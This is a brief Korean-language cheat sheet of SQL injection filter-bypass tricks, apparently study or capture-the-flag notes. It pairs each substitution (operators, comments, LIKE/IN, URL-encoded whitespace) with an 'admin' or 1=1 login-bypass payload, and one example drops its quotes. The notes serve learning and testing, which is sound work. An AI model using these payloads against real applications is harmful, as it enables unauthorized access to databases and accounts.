# SQL injection

### 필터링 우회

OR/AND     
->  ||/&&   
ex) select * from table where id='admin' or 1=1   
->  select * from table where id='admin' || 1=1   
ex) select * from table where id='admin' and pw='password'   
->  select * from table where id='admin' && pw='password'   

주석   
->  -- #   
-- 주석 뒤에 공백문자가 있어야 된다.  

=   
->  like in
ex) select * from table where id='admin'  
->  select * from table where id like 'admin'   
->  select * from table where id in('admin')   

공백문자   
* tab : %09
* line feed(\n) : %0a
* carrage return(\r) : %0d
* 주석 : /**/
* 괄호 : ()
* 더하기 : +   
ex) id='admin' or 1=1   
->  id='admin'%09or%091=1   
->  id='admin'%0aor%0a1=1   
->  id='admin'%0dor%0d1=1   
->  id='admin'/**/or/**/1=1   
->  id=(admin)or(1=1)   
->  id="admin"+or+1=1

